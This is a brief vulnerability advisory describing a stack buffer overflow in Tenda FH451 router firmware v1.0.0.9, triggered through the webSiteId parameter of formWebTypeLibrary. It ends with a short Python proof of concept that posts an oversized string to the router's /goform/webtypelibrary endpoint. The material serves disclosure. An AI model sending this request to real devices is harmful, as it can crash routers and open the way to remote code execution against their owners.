# Tenda FH451 formWebTypeLibrary
### Overview
vendor: Tenda

product: FH451

version: v1.0.0.9

type: Stack Overflow
### Vulnerability Description
Tenda FH451 v1.0.0.9 were discovered to contain a stack overflow via the webSiteId parameter in the formWebTypeLibrary function.

### Vulnerability details
In function formWebTypeLibrary line 30, it reads in a user-provided parameter `webSiteId`. The variable `Var` is passed to the `strcat` function without any length check, which may overflow the stack-based buffer `dest`. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/5.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/webtypelibrary"

data = {
    "webSiteId": "a" * 1000
}

response = requests.post(url, data=data)
print(response.text)
```